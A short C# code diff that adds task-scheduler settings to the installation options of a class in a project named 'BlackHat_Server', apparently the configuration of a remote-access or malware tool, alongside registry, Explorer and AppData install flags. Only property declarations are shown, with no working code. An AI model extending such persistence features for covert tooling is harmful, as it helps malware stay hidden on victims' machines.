@@ -113,6 +113,8 @@ namespace BlackHat_Server.Class
 
         #region INSTALLATION
 
+        public bool UseTaskScheduler { get; set; }
+        public string TaskSchedulerName { get; set; }
         public bool bUseHKCU { get; set; }
         public bool bUseExplorer { get; set; }
         public string sAppDataInstall { get; set; }
